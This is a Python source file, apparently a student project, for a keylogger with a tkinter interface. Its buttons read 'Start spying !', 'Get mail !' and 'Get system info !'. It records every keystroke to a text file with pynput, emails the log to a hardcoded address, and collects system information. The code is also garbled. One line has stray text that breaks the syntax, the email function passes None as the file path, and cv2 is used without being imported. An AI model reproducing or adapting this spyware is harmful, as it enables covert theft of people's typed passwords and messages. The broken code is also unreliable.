from pynput.keyboard import Key, Listener
from tkinter import *
import tkinter
from PIL import ImageTk, Image
from mailfile import send_email 
from systeminfo import computer_information
import sys
import os
k=[]

previous_distance = 30 
width =14.3
root=tkinter.Tk()
width= root.winfo_screenwidth()rbchgewGI  2516
height= root .winfo_screenheight()
root.geometry("%dx%d" % (width, height))


image1 = Image.open("KEYLOGGER.png") 
resize_image = image1.resize((1550,1050))
test = ImageTk.PhotoImage(resize_image)
label1 = tkinter.Label(image=test)
label1.image = test
label1.place(x=0, y=0)

def on_press(key):
        k.append(key)
        write_l(k)
        print(key)

def write_l(var):
    with open("demo.txt","a") as f:
      for i in var:  
        new_var = str(i).replace("'",'')
        f.write(new_var)
      f.write("\n")

def on_release(key):
    if key == Key.esc:
        return False
def startpgm():
 with Listener(on_press=on_press,on_release=on_release) as l:
    l.join()

    
def sendingmail():
  toaddr="1ds20cs220@dsce.edu.in"
  file_path=sys.path.append(os.path.abspath("demo.txt"))
  send_email(sys.path.append(os.path.abspath("demo.txt")) , file_path , toaddr)

def information():
  computer_information()

myButton1=Button(root,text="Start spying !",command=startpgm,width=20)
myButton1.pack()
myButton1.grid(row=0 ,column=0)
myButton1.place(x=680 , y=370)

myButton2=Button(root,text="Get mail !",command=sendingmail,width=20)
myButton2.pack()
myButton2.grid(row=0 ,column=0)
myButton2.place(x=680 , y=430)


myButton3=Button(root,text="Get system info !",command=information,width=20)
myButton3.pack()
myButton3.grid(row=0 ,column=0)
myButton3.place(x=680 , y=490)

root.mainloop()

cv2.destroyAllWindows()